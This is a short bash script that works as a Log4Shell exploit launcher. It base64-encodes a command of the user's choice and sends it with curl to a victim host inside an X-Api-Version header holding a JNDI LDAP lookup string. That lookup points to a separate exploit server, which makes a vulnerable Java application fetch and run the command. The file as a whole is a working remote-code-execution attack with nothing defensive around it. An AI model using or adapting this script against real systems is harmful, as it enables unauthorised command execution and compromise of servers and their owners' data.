#!/bin/bash

if [[ "$#" -lt 3 ]]
then
	echo "Usage: $0 <VICTIM> <EXPLOIT_SERVER> <COMMAND>"
	echo "example: $0 192.168.0.100:8080 192.168.0.100:1389 mkdir /test"
	exit 1
fi

VICTIM=$1
EXPLOIT_SERVER=$2
shift 2

COMMAND=$@
PAYLOAD=$(echo -n "$COMMAND" | base64)

curl $VICTIM -H "X-Api-Version: \${jndi:ldap://${EXPLOIT_SERVER}/Basic/Command/Base64/${PAYLOAD}}"

